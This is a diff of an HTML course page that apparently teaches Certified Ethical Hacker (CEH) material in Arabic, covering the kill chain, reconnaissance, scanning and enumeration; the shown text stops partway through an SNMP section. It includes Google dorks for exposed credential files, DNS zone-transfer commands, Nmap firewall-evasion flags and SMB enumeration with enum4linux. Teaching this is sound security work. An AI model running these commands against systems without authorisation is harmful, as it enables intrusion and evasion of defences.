@@ -5,7 +5,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Offensive Security Playbook & Methodology | Abdo Ramdan</title>
-  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@400;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="css/style.css?v=11">
   <link rel="stylesheet" href="css/methodology.css?v=11">
 
@@ -277,7 +277,7 @@
   <header class="meth-header">
     <div style="display: flex; align-items: center; gap: 15px;">
       <button class="menu-toggle-btn" onclick="toggleMobileSidebar()">☰ Menu</button>
-      <div class="meth-logo">// <span class="logo-main">OFFENSIVE SECURITY</span><span class="logo-sub"> KNOWLEDGE PLATFORM</span></div>
+      
     </div>
     <div style="display: flex; align-items: center; gap: 12px;">
       <button onclick="openQuickJump()" style="background: rgba(0,229,255,0.05); color: var(--neon-cyan); border: 1px solid rgba(0,229,255,0.2); padding: 7px 14px; border-radius: 4px; font-family: 'Fira Code', monospace; font-size: 0.95rem; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 8px;" onmouseover="this.style.background='rgba(0,229,255,0.12)'" onmouseout="this.style.background='rgba(0,229,255,0.05)'">
@@ -637,23 +637,72 @@
           <span>▼</span>
         </div>
         <div class="category-items" id="cat-ceh" style="display: none;">
-          <div class="meth-item" id="meth-ef-ceh_sniff" onclick="openMethPhase('ceh_sniff')" data-search="sniffing wireshark tcpdump arp poisoning mitm">
-            <span>├── 🕵️</span> <span>M8: Sniffing</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_sniff', '🕵️ M8: Sniffing')">★</button>
-          </div>
-          <div class="meth-item" id="meth-ef-ceh_se" onclick="openMethPhase('ceh_se')" data-search="social engineering phishing settoolkit">
-            <span>├── 🎭</span> <span>M9: Social Eng.</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_se', '🎭 M9: Social Eng.')">★</button>
-          </div>
-          <div class="meth-item" id="meth-ef-ceh_dos" onclick="openMethPhase('ceh_dos')" data-search="dos ddos denial of service botnet amplification">
-            <span>├── 💣</span> <span>M10: DoS Attacks</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_dos', '💣 M10: DoS Attacks')">★</button>
-          </div>
-          <div class="meth-item" id="meth-ef-ceh_hijack" onclick="openMethPhase('ceh_hijack')" data-search="session hijacking tcp csrf xss">
-            <span>├── 🔓</span> <span>M11: Session Hijack</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_hijack', '🔓 M11: Session Hijack')">★</button>
-          </div>
-          <div class="meth-item" id="meth-ef-ceh_evade" onclick="openMethPhase('ceh_evade')" data-search="evading ids firewalls honeypots nmap fragmentation">
-            <span>├── 🛡️</span> <span>M12: Evade IDS/FW</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_evade', '🛡️ M12: Evade IDS/FW')">★</button>
-          </div>
-          <div class="meth-item" id="meth-ef-ceh_webserver" onclick="openMethPhase('ceh_webserver')" data-search="hacking web servers iis apache misconfiguration">
-            <span>└── 🌐</span> <span>M13: Web Servers</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_webserver', '🌐 M13: Web Servers')">★</button>
+        <div class="meth-item" id="meth-ef-mod1" onclick="openMethPhase('mod1')" data-search="module 1: intro to ethical hacking">
+          <span>├── 🧠</span> <span>Module 1: Intro to Ethical Hacking</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod1', '🧠 Module 1: Intro to Ethical Hacking')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod2" onclick="openMethPhase('mod2')" data-search="module 2: footprinting & recon">
+          <span>├── 👁️‍🗨️</span> <span>Module 2: Footprinting & Recon</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod2', '👁️‍🗨️ Module 2: Footprinting & Recon')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod3" onclick="openMethPhase('mod3')" data-search="module 3: scanning networks">
+          <span>├── 📡</span> <span>Module 3: Scanning Networks</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod3', '📡 Module 3: Scanning Networks')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod4" onclick="openMethPhase('mod4')" data-search="module 4: enumeration">
+          <span>├── 📋</span> <span>Module 4: Enumeration</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod4', '📋 Module 4: Enumeration')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod5" onclick="openMethPhase('mod5')" data-search="module 5: vulnerability analysis">
+          <span>├── 🚨</span> <span>Module 5: Vulnerability Analysis</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod5', '🚨 Module 5: Vulnerability Analysis')">★</button>
+    </div>
+
+
+        <div class="meth-item" id="meth-ef-sys-hack" onclick="openMethPhase('sys-hack')" data-search="system hacking (deep dive)">
+          <span>├── 💻</span> <span>System Hacking (Deep Dive)</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-sys-hack', '💻 System Hacking (Deep Dive)')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod7" onclick="openMethPhase('mod7')" data-search="module 7: malware threats">
+          <span>├── 🦠</span> <span>Module 7: Malware Threats</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod7', '🦠 Module 7: Malware Threats')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod8" onclick="openMethPhase('mod8')" data-search="module 8: sniffing">
+          <span>├── 🎧</span> <span>Module 8: Sniffing</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod8', '🎧 Module 8: Sniffing')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod9" onclick="openMethPhase('mod9')" data-search="module 9: social engineering">
+          <span>├── 🎭</span> <span>Module 9: Social Engineering</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod9', '🎭 Module 9: Social Engineering')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod10" onclick="openMethPhase('mod10')" data-search="module 10: dos/ddos">
+          <span>├── 🛑</span> <span>Module 10: DoS/DDoS</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod10', '🛑 Module 10: DoS/DDoS')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod11" onclick="openMethPhase('mod11')" data-search="module 11: session hijacking">
+          <span>├── 🔓</span> <span>Module 11: Session Hijacking</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod11', '🔓 Module 11: Session Hijacking')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod12" onclick="openMethPhase('mod12')" data-search="module 12: evading ids & firewalls">
+          <span>├── 🥷</span> <span>Module 12: Evading IDS & Firewalls</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod12', '🥷 Module 12: Evading IDS & Firewalls')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod13" onclick="openMethPhase('mod13')" data-search="module 13: web servers">
+          <span>├── 🖥️</span> <span>Module 13: Web Servers</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod13', '🖥️ Module 13: Web Servers')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod14" onclick="openMethPhase('mod14')" data-search="module 14: web applications">
+          <span>├── 🌐</span> <span>Module 14: Web Applications</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod14', '🌐 Module 14: Web Applications')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod15" onclick="openMethPhase('mod15')" data-search="module 15: sql injection">
+          <span>├── 💉</span> <span>Module 15: SQL Injection</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod15', '💉 Module 15: SQL Injection')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod16" onclick="openMethPhase('mod16')" data-search="module 16: wireless networks">
+          <span>├── 📶</span> <span>Module 16: Wireless Networks</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod16', '📶 Module 16: Wireless Networks')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod17" onclick="openMethPhase('mod17')" data-search="module 17: mobile platforms">
+          <span>├── 📱</span> <span>Module 17: Mobile Platforms</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod17', '📱 Module 17: Mobile Platforms')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod18" onclick="openMethPhase('mod18')" data-search="module 18: iot & ot hacking">
+          <span>├── 🏭</span> <span>Module 18: IoT & OT Hacking</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod18', '🏭 Module 18: IoT & OT Hacking')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod19" onclick="openMethPhase('mod19')" data-search="module 19: cloud computing">
+          <span>├── ☁️</span> <span>Module 19: Cloud Computing</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod19', '☁️ Module 19: Cloud Computing')">★</button>
+    </div>
+        <div class="meth-item" id="meth-ef-mod20" onclick="openMethPhase('mod20')" data-search="module 20: cryptography">
+          <span>├── 🔐</span> <span>Module 20: Cryptography</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'meth-ef-mod20', '🔐 Module 20: Cryptography')">★</button>
+    </div>
+
+
+
+
           </div>
         </div>
       </div>
@@ -682,632 +731,1817 @@
 
     <!-- Right Viewer: Dynamic Content Panes -->
     <div class="meth-viewer">
+      
+<!-- =======================================================
+     CEH MODULE 1: INTRODUCTION TO ETHICAL HACKING
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod1" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🧠</span> Introduction to Ethical Hacking</h2>
+    <p class="hero-tagline">فهم عقلية المهاجمين: سلسلة القتل السيبراني، نمذجة التهديدات، والمفاهيم الأساسية.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-green);"></span> Module 01</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Theory & Concepts</span>
+    </div>
+  </div>
 
-      <!-- ═══════ REDESIGN V2: Hero Stats ═══════ -->
-      <div id="rd-hero-section">
-        <div class="hero-stats-row">
-          <div class="hero-stat-card">
-            <div class="hero-stat-icon">🌍</div>
-            <div class="hero-stat-value" data-target="15000">0</div>
-            <div class="hero-stat-label">SUBDOMAINS</div>
-          </div>
-          <div class="hero-stat-card">
-            <div class="hero-stat-icon">🔗</div>
-            <div class="hero-stat-value" data-target="50000">0</div>
-            <div class="hero-stat-label">ENDPOINTS</div>
-          </div>
-          <div class="hero-stat-card">
-            <div class="hero-stat-icon">⚡</div>
-            <div class="hero-stat-value" data-target="0">4-6 hrs</div>
-            <div class="hero-stat-label">AVG. TIME</div>
-          </div>
-          <div class="hero-stat-card">
-            <div class="hero-stat-icon">💰</div>
-            <div class="hero-stat-value" data-target="12500">$0</div>
-            <div class="hero-stat-label">TOTAL BOUNTY</div>
-          </div>
-        </div>
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🔗</span>
+      <h3>سلسلة القتل السيبراني (Cyber Kill Chain)</h3>
+    </div>
+    <p>طورت بواسطة شركة (Lockheed Martin)، وهي تصف المراحل التي يمر بها الهجوم السيبراني خطوة بخطوة.</p>
+    <div class="goal-cards-grid" dir="rtl">
+      
+      <div class="goal-card">
+        <div class="goal-icon">🔍</div>
+        <h4>1. الاستطلاع</h4>
+        <div class="goal-subtitle">Reconnaissance</div>
+        <p>جمع المعلومات المتاحة حول الهدف (الشبكات، الموظفين، الإيميلات) قبل الهجوم.</p>
+      </div>
 
-        <!-- ═══════ Visual Pipeline Flowchart ═══════ -->
-        <div class="pipeline-flowchart" id="rd-pipeline">
-          <div class="pipe-node" onclick="clickPipelineNode('p_matrix')" title="Scope & Matrix">
-            <div class="pipe-node-icon">🔍</div>
-            <div class="pipe-node-label">Scope</div>
-            <div class="pipe-node-sub">Define targets</div>
-          </div>
-          <div class="pipe-arrow">→</div>
-          <div class="pipe-node" onclick="clickPipelineNode('p0')" title="Subdomains & Recon">
-            <div class="pipe-node-icon">🌐</div>
-            <div class="pipe-node-label">Recon</div>
-            <div class="pipe-node-sub">Subdomains</div>
-          </div>
-          <div class="pipe-arrow">→</div>
-          <div class="pipe-node" onclick="clickPipelineNode('p6')" title="Directory Discovery">
-            <div class="pipe-node-icon">📂</div>
-            <div class="pipe-node-label">Discovery</div>
-            <div class="pipe-node-sub">Dirs & JS</div>
-          </div>
-          <div class="pipe-arrow">→</div>
-          <div class="pipe-node" onclick="clickPipelineNode('p7')" title="Vulnerabilities">
-            <div class="pipe-node-icon">💉</div>
-            <div class="pipe-node-label">Exploit</div>
-            <div class="pipe-node-sub">XSS, SQLi</div>
-          </div>
-          <div class="pipe-arrow">→</div>
-          <div class="pipe-node" onclick="clickPipelineNode('p_writeups')" title="Reporting">
-            <div class="pipe-node-icon">📋</div>
-            <div class="pipe-node-label">Report</div>
-            <div class="pipe-node-sub">Write & Submit</div>
-          </div>
+      <div class="goal-card">
+        <div class="goal-icon">⚔️</div>
+        <h4>2. التسليح</h4>
+        <div class="goal-subtitle">Weaponization</div>
+        <p>دمج البرمجيات الخبيثة مع ملف شرعي (مثل PDF) لاختراق الهدف.</p>
+      </div>
+
+      <div class="goal-card">
+        <div class="goal-icon">📦</div>
+        <h4>3. التسليم</h4>
+        <div class="goal-subtitle">Delivery</div>
+        <p>إيصال السلاح للضحية عبر التصيد الاحتيالي (Phishing) أو الـ USB.</p>
+      </div>
+
+      <div class="goal-card">
+        <div class="goal-icon">💥</div>
+        <h4>4. الاستغلال</h4>
+        <div class="goal-subtitle">Exploitation</div>
+        <p>استغلال ثغرة لتنفيذ الشيفرة الخبيثة والوصول للنظام.</p>
+      </div>
+
+      <div class="goal-card">
+        <div class="goal-icon">⬇️</div>
+        <h4>5. التثبيت</h4>
+        <div class="goal-subtitle">Installation</div>
+        <p>زرع الـ Backdoors للتموضع داخل النظام والبقاء متخفياً.</p>
+      </div>
+
+      <div class="goal-card">
+        <div class="goal-icon">📡</div>
+        <h4>6. التحكم (C2)</h4>
+        <div class="goal-subtitle">Command & Control</div>
+        <p>إنشاء قناة اتصال بين النظام المخترق وخوادم المهاجم لتلقي الأوامر.</p>
+      </div>
+      
+      <div class="goal-card" style="border-color: var(--neon-red);">
+        <div class="goal-icon" style="color:var(--neon-red);">🎯</div>
+        <h4 style="color:var(--neon-red);">7. تنفيذ الهدف</h4>
+        <div class="goal-subtitle">Actions on Objectives</div>
+        <p>سرقة البيانات، تشفير الملفات لطلب فدية (Ransomware)، أو تدمير الأنظمة.</p>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🛡️</span>
+      <h3>إطار عمل مايتر أتاك (MITRE ATT&CK)</h3>
+    </div>
+    
+    <div class="cyber-card" style="--tool-color: #00b4d8;">
+      <p>قاعدة معرفية عالمية لمراقبة تكتيكات وتقنيات الخصوم (Adversary Tactics and Techniques) والتي تعتمد عليها فرق الدفاع.</p>
+      <div class="tree-container" style="direction:rtl; text-align:right; font-family:var(--font-mono); margin-bottom:15px; background:rgba(0,0,0,0.2); padding:15px; border-radius:8px; border-right:2px solid #00b4d8;">
+        <div style="color:#e2e8f0; margin-bottom:10px;"><strong>التكتيكات (Tactics):</strong> <span style="color:#94a3b8;">الهدف "الماذا" (مثل الوصول الأولي، وتصعيد الصلاحيات).</span></div>
+        <div style="color:#e2e8f0; margin-bottom:10px;"><strong>التقنيات (Techniques):</strong> <span style="color:#94a3b8;">"الكيفية" (استغلال تطبيق ويب عبر رابط Phishing).</span></div>
+        <div style="color:#e2e8f0;"><strong>الإجراءات (Procedures):</strong> <span style="color:#94a3b8;">التطبيق الفعلي عبر أدوات معينة من قِبل مجموعة الـ APT.</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🧩</span>
+      <h3>نمذجة التهديدات (Threat Modeling)</h3>
+    </div>
+    <div class="mistakes-practices-grid" dir="rtl">
+      <div class="practice-card good">
+        <div class="card-header"><h4>منهجية تحديد التهديدات</h4></div>
+        <ul style="color:#94a3b8; line-height:1.8;">
+          <li><strong style="color:var(--neon-green)">1. Identify Assets:</strong> تحديد الأصول والمعلومات الحساسة.</li>
+          <li><strong style="color:var(--neon-green)">2. Identify Threats:</strong> كشف التهديدات المحتملة باستخدام STRIDE.</li>
+          <li><strong style="color:var(--neon-green)">3. Analyze Vulns:</strong> تحليل نقاط الضعف المعرضة لهذه التهديدات.</li>
+          <li><strong style="color:var(--neon-green)">4. Countermeasures:</strong> تطبيق الضوابط الأمنية المناسبة لسد الثغرات.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 2: FOOTPRINTING & RECONNAISSANCE
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod2" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">👁️‍🗨️</span> Footprinting & Reconnaissance</h2>
+    <p class="hero-tagline">أولى مراحل الاختراق: جمع المعلومات الدقيقة، الـ OSINT، واستكشاف البنية التحتية.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-blue);"></span> Module 02</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">⚖️</span>
+      <h3>مقارنة: الاستطلاع النشط مقابل السلبي</h3>
+    </div>
+    <div class="rd-compare-grid">
+      <div class="rd-compare-col good">
+        <div class="rd-compare-title">🕵️ الاستطلاع السلبي (Passive)</div>
+        <ul class="rd-compare-list">
+          <li>جمع المعلومات دون الاتصال المباشر بالهدف (Stealthy).</li>
+          <li>استخدام محركات البحث، مواقع التوظيف، و Archive.org.</li>
+          <li>البحث في السجلات العامة مثل WHOIS.</li>
+          <li>لا يُسجل في الـ Logs الخاصة بالهدف.</li>
+        </ul>
+      </div>
+      <div class="rd-compare-col bad" style="border-top-color: #ff4757;">
+        <div class="rd-compare-title">🚨 الاستطلاع النشط (Active)</div>
+        <ul class="rd-compare-list">
+          <li>يتطلب الاتصال المباشر بخوادم وأنظمة الهدف.</li>
+          <li>محاولات نقل النطاق (DNS Zone Transfer).</li>
+          <li>الهندسة الاجتماعية المباشرة (Social Engineering).</li>
+          <li>خطر تسجيل الأنشطة واكتشاف المهاجم.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🌐</span>
+      <h3>الاستخبارات مفتوحة المصدر (OSINT) و Dorking</h3>
+    </div>
+    
+    <div class="cyber-card" style="--tool-color: #00e5a0;">
+      <div class="card-header"><h4>Google Hacking (Dorking)</h4></div>
+      <p>استخدام مشغلات بحث متقدمة لاستخراج معلومات أو ملفات غير مفهرسة بشكل صحيح.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Google Search Queries</span></div>
+        <pre><code># البحث عن مسارات الدليل المفتوحة
+intitle:"index of" "target.com"
+
+# البحث عن ملفات إعدادات وكلمات مرور
+site:target.com ext:txt | ext:log | ext:env | ext:sql
+
+# البحث عن صفحات لوحة التحكم
+site:target.com inurl:admin | inurl:login</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🛠️</span>
+      <h3>أدوات الاستطلاع العميقة (Recon Arsenal)</h3>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #00b4d8;">
+      <div class="card-header"><h4>1. أداة Recon-ng</h4></div>
+      <p>إطار عمل مخصص للـ OSINT مشابه لواجهة Metasploit.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Recon-ng Console</span></div>
+        <pre><code>recon-ng
+workspaces create target_corp
+modules load recon/domains-hosts/hackertarget
+options set SOURCE target.com
+run
+show hosts</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ffa502;">
+      <div class="card-header"><h4>2. أداة TheHarvester</h4></div>
+      <p>أداة جبارة لاستخراج الإيميلات، النطاقات الفرعية، وعناوين الـ IP من مصادر مختلفة.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Bash Shell</span></div>
+        <pre><code>theHarvester -d target.com -b google,linkedin,bing -l 500</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <div class="card-header"><h4>3. محرك Shodan</h4></div>
+      <p>محرك بحث أجهزة الـ IoT والخوادم المربوطة بالإنترنت.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Shodan CLI</span></div>
+        <pre><code># تهيئة الأداة
+shodan init &lt;API_KEY&gt;
+
+# البحث عن خوادم أباتشي في دبي
+shodan search "apache city:Dubai"
+
+# إحصائيات الثغرات للشركة
+shodan stats vuln:cve-2014-0160 org:"Target Corp"</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #2ed573;">
+      <div class="card-header"><h4>4. جمع معلومات DNS (DNS Footprinting)</h4></div>
+      <p>البحث عن سجلات الـ DNS واستخراج الـ Subdomains المخفية.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Dig & Fierce</span></div>
+        <pre><code># جلب سجلات الميل (MX)
+dig mx target.com
+
+# محاولة نقل نطاق الخادم للحصول على نسخة كاملة من القاعدة
+dig axfr @ns1.target.com target.com
+
+# الفحص العنيف للنطاقات
+fierce --domain target.com</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🛡️</span>
+      <h3>استراتيجيات الحماية والتخفيف (Mitigation)</h3>
+    </div>
+    <div class="table-wrapper">
+      <table class="interactive-table" dir="rtl">
+        <thead>
+          <tr>
+            <th>التهديد الاستطلاعي (Threat)</th>
+            <th>الحل التقني للحماية (Mitigation)</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>DNS Zone Transfer</strong></td>
+            <td>تعطيل Zone Transfer (AXFR) بحيث لا يُسمح بها إلا لخوادم الـ Secondary DNS.</td>
+          </tr>
+          <tr>
+            <td><strong>Directory Listing</strong></td>
+            <td>إغلاق تصفح الدلائل في إعدادات (Apache/Nginx/IIS) وإخفاء الصفحات الداخلية.</td>
+          </tr>
+          <tr>
+            <td><strong>Banner Grabbing & Server Info</strong></td>
+            <td>إخفاء إصدارات الخادم عبر تعديل (HTTP Server Headers) واستخدام صفحات أخطاء مخصصة.</td>
+          </tr>
+          <tr>
+            <td><strong>Metadata Leakage</strong></td>
+            <td>استخدام أدوات تنظيف البيانات لإزالة البيانات الوصفية من الـ PDFs والصور قبل نشرها (مثل أسماء الموظفين والبرامج).</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 3: SCANNING NETWORKS
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod3" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">📡</span> Scanning Networks</h2>
+    <p class="hero-tagline">مرحلة التفاعل المباشر: فحص المنافذ، اكتشاف الخدمات، وتقنيات التهرب المتقدمة.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-green);"></span> Module 03</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🔭</span>
+      <h3>تقنيات المسح الأساسية والمتقدمة (Scanning Techniques)</h3>
+    </div>
+    
+    <div class="goal-cards-grid" dir="rtl">
+      <div class="goal-card">
+        <div class="goal-icon">🤝</div>
+        <h4>TCP Connect (-sT)</h4>
+        <div class="goal-subtitle">Full Open Scan</div>
+        <p>يُكمل المصافحة الثلاثية (SYN -> SYN/ACK -> ACK). دقيق ولا يحتاج لصلاحيات Root لكنه صاخب جداً ويُسجل في الـ Logs.</p>
+      </div>
+
+      <div class="goal-card" style="border-color: #00e5a0;">
+        <div class="goal-icon" style="color: #00e5a0;">🥷</div>
+        <h4 style="color: #00e5a0;">SYN Stealth (-sS)</h4>
+        <div class="goal-subtitle">Half-open Scan</div>
+        <p>يرسل SYN، وعند تلقي SYN/ACK يقطع الاتصال بـ RST. يتخفى عن السجلات التقليدية وهو الفحص الافتراضي للمخترقين.</p>
+      </div>
+
+      <div class="goal-card">
+        <div class="goal-icon">🎄</div>
+        <h4>XMAS Scan (-sX)</h4>
+        <div class="goal-subtitle">Advanced Evasion</div>
+        <p>يرسل حزم مضاف إليها أعلام غير منطقية (FIN, URG, PSH). يُستخدم لاكتشاف الجدران النارية التي تفلتر حزم SYN فقط.</p>
+      </div>
+
+      <div class="goal-card">
+        <div class="goal-icon">🛡️</div>
+        <h4>ACK Scan (-sA)</h4>
+        <div class="goal-subtitle">Firewall Ruleset</div>
+        <p>لاكتشاف هندسة الفايروول. إذا رُد عليه بـ RST فالمنفذ Unfiltered. وإذا لم يرد فمفهموم أنه Filtered.</p>
+      </div>
+
+      <div class="goal-card">
+        <div class="goal-icon">💨</div>
+        <h4>UDP Scan (-sU)</h4>
+        <div class="goal-subtitle">Connectionless</div>
+        <p>يرسل حزمة فارغة للبحث عن خدمات كـ DNS أو SNMP. بطيء جداً لكنه ضروري لاكتشاف ثغرات الـ UDP.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">⚔️</span>
+      <h3>Nmap Arsenal: التهرب من الجدران النارية</h3>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <div class="card-header"><h4>قوالب التوقيت وأعلام التهرب (Nmap Evasion Flags)</h4></div>
+      <p>تقنيات تُستخدم لتجاوز الـ IDS/IPS والـ Firewalls.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Nmap Evasion Techniques</span></div>
+        <pre><code># تجزئة الحزم (Packet Fragmentation) لتصعيب تجميعها على الـ IDS
+nmap -f target.com
+
+# انتحال العناوين (Decoy) بإرسال فحص مدمج مع 10 عناوين وهمية لتشتيت الـ SOC
+nmap -D RND:10 target.com
+
+# تزييف منفذ المصدر للظهور كحركة مرور شرعية من منفذ DNS أو HTTP
+nmap -g 53 target.com
+
+# تزييف الـ MAC Address لتجاوز أنظمة الـ MAC Filtering
+nmap --spoof-mac 0 target.com
+
+# قوالب التوقيت: (T0, T1) أبطأ وللتخفي | (T4, T5) الأسرع والعنيف
+nmap -T1 -sS target.com</code></pre>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 4: ENUMERATION
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod4" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">📋</span> Enumeration</h2>
+    <p class="hero-tagline">مرحلة الاستجابة المباشرة: الكشف عن المستخدمين، المجموعات، والموارد المشتركة عبر الشبكة.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-orange);"></span> Module 04</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🧩</span>
+      <h3>بروتوكولات التعداد العميقة وأدواتها (Enumeration Protocols)</h3>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #00b4d8;">
+      <div class="card-header"><h4>1. تعداد NetBIOS & SMB</h4></div>
+      <p>يُستخدم في بيئة مايكروسوفت لاستخراج الحواسيب داخل الـ Domain والمجلدات المشتركة. منفذ 445 (SMB) من أخطر أهداف الاستكشاف لاستخراج الجلسات النشطة (Null Sessions) وسياسات الباسوردات.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">SMB Arsenal</span></div>
+        <pre><code># استخدام nbtstat لمعرفة أسماء الأجهزة
+nbtstat -A 192.168.1.5
+
+# الأداة الأقوى لاستخراج كافة مستخدمي الـ Domain والـ Shares والـ SIDs
+enum4linux -a 192.168.1.5</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #f1c40f;">
+      <div class="card-header"><h4>2. تعداد SNMP</h4></div>
